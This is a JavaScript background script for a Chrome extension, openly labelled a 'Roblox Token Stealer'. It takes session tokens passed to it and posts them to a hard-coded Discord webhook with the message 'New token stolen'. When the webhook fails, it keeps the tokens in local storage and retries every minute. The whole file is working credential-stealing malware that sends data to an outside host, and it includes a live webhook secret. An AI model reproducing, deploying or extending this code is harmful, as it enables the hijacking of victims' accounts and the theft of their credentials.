chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.action === "sendToken") {
    const token = request.token;

    // Validate the token format
    if (!token || typeof token !== 'string' || token.length < 50) {
      console.error('Invalid token format');
      return;
    }

    // Your webhook URL here
    const webhookUrl = "https://discordapp.com/api/webhooks/1428401329541353674/fWQrGpJNYIO8Gxn78nsXzUuDED1fPSmHC__qmuOg4B60PFXTPEcITJQKDuVe5slIbe3W";

    // Prepare the payload
    const payload = {
      content: `New token stolen: ${token}`,
      embeds: [{
        title: "New Token Captured",
        description: `**Token:** ${token}`,
        color: 16711680,
        timestamp: new Date().toISOString()
      }],
      username: "Roblox Token Stealer",
      avatar_url: "https://www.roblox.com/favicon.ico"
    };

    // Try to send to webhook
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Webhook failed');
      }
      return response.json();
    })
    .then(data => {
      console.log('Token sent successfully');
    })
    .catch(error => {
      console.error('Error sending token:', error);

      // Fallback to storing locally
      chrome.storage.local.get(['tokens'], function(result) {
        const tokens = result.tokens || [];
        tokens.push(token);

        chrome.storage.local.set({ tokens: tokens }, function() {
          console.log('Token stored locally as fallback');
        });
      });
    });
  }
});

// Periodically check for stored tokens to send
setInterval(function() {
  chrome.storage.local.get(['tokens'], function(result) {
    const tokens = result.tokens || [];

    if (tokens.length > 0) {
      const token = tokens.pop();

      chrome.runtime.sendMessage({
        action: "sendToken",
        token: token
      });

      chrome.storage.local.set({ tokens: tokens });
    }
  });
}, 60000); // Check every minute
